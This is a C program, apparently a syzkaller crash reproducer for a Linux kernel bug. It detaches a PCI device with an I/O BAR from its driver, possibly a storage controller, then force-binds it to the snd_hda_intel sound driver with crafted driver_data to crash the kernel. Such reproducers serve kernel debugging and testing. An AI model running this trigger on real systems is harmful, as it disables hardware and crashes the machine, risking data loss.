// https://syzkaller.appspot.com/bug?id=f5237c3ba3752c14085033ea605599ed7776efd6
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>

#define SYSFS_PCI_DEVICES "/sys/bus/pci/devices"
#define SYSFS_HDA_DRIVER "/sys/bus/pci/drivers/snd_hda_intel"
#define IORESOURCE_IO 0x00000100

int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) {
        int ret = write(fd, data, strlen(data));
        close(fd);
        return ret >= 0 ? 0 : -1;
    }
    return -1;
}

int main() {
    DIR *dir = opendir(SYSFS_PCI_DEVICES);
    if (!dir) {
        perror("opendir");
        return 1;
    }

    struct dirent *ent;
    char target_pci_id[32] = {0};
    char fallback_pci_id[32] = {0};
    char vendor[16] = {0}, device[16] = {0};

    // 1. Find a PCI device with an I/O BAR at BAR 0
    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_name[0] == '.') continue;

        char path[512];
        snprintf(path, sizeof(path), "%s/%s/resource", SYSFS_PCI_DEVICES, ent->d_name);
        FILE *f = fopen(path, "r");
        if (!f) continue;

        unsigned long long start, end, flags;
        int has_io_bar0 = 0;
        // The first line in the resource file corresponds to BAR 0
        if (fscanf(f, "%llx %llx %llx", &start, &end, &flags) == 3) {
            if (flags & IORESOURCE_IO) {
                has_io_bar0 = 1;
            }
        }
        fclose(f);

        if (has_io_bar0) {
            snprintf(path, sizeof(path), "%s/%s/class", SYSFS_PCI_DEVICES, ent->d_name);
            f = fopen(path, "r");
            unsigned int class_val = 0;
            if (f) {
                if (fscanf(f, "%x", &class_val) != 1) class_val = 0;
                fclose(f);
            }
            
            // Prefer non-storage controllers to avoid unbinding the root disk
            if ((class_val >> 16) != 0x01) { 
                strcpy(target_pci_id, ent->d_name);
                break;
            } else {
                strcpy(fallback_pci_id, ent->d_name);
            }
        }
    }
    closedir(dir);

    if (!target_pci_id[0]) {
        if (fallback_pci_id[0]) {
            strcpy(target_pci_id, fallback_pci_id);
        } else {
            printf("[-] No PCI device with I/O BAR 0 found on this system.\n");
            return 1;
        }
    }

    // 2. Read vendor and device IDs
    char path[512];
    snprintf(path, sizeof(path), "%s/%s/vendor", SYSFS_PCI_DEVICES, target_pci_id);
    FILE *f = fopen(path, "r");
    if (f) { if(fscanf(f, "%s", vendor) != 1) vendor[0]=0; fclose(f); }

    snprintf(path, sizeof(path), "%s/%s/device", SYSFS_PCI_DEVICES, target_pci_id);
    f = fopen(path, "r");
    if (f) { if(fscanf(f, "%s", device) != 1) device[0]=0; fclose(f); }

    printf("[+] Target device: %s (Vendor: %s, Device: %s)\n", target_pci_id, vendor, device);

    // 3. Unbind from current driver
    snprintf(path, sizeof(path), "%s/%s/driver/unbind", SYSFS_PCI_DEVICES, target_pci_id);
    write_file(path, target_pci_id);

    // 4. Add new ID to snd_hda_intel
    // We must use a driver_data that exactly matches an entry in azx_ids and has AZX_DRIVER_SKL (3) in the lower 8 bits.
    unsigned long driver_data_candidates[] = {
        0x46202403, // AZX_DRIVER_SKL | AZX_DCAPS_INTEL_SKYLAKE (with I915)
        0x46200403, // AZX_DRIVER_SKL | AZX_DCAPS_INTEL_SKYLAKE (without I915)
        0xC6202403, // AZX_DRIVER_SKL | AZX_DCAPS_INTEL_LNL (with I915)
        0xC6200403, // AZX_DRIVER_SKL | AZX_DCAPS_INTEL_LNL (without I915)
        0x40000001, // AZX_DRIVER_ICH | AZX_DCAPS_NO_ALIGN_BUFSIZE
        0x40000002, // AZX_DRIVER_PCH | AZX_DCAPS_NO_ALIGN_BUFSIZE
        0x00000003, // AZX_DRIVER_SKL
    };
    
    int success = 0;
    for (int i = 0; i < sizeof(driver_data_candidates)/sizeof(driver_data_candidates[0]); i++) {
        char new_id_data[128];
        // Format: vendor device subvendor subdevice class class_mask driver_data
        // FFFFFFFF is PCI_ANY_ID
        snprintf(new_id_data, sizeof(new_id_data), "%s %s FFFFFFFF FFFFFFFF 0 0 %lx", vendor, device, driver_data_candidates[i]);
        snprintf(path, sizeof(path), "%s/new_id", SYSFS_HDA_DRIVER);
        if (write_file(path, new_id_data) == 0) {
            printf("[+] Successfully added new_id with driver_data = 0x%lx\n", driver_data_candidates[i]);
            success = 1;
            break;
        }
    }

    if (!success) {
        printf("[-] Failed to add new_id. The PCI core rejected the driver_data.\n");
        return 1;
    }

    // 5. Bind to snd_hda_intel to trigger the bug
    snprintf(path, sizeof(path), "%s/bind", SYSFS_HDA_DRIVER);
    if (write_file(path, target_pci_id) < 0) {
        printf("[-] Failed to bind device\n");
        return 1;
    }

    printf("[+] Triggered bind. Waiting for async probe to crash...\n");
    sleep(3);
    return 0;
}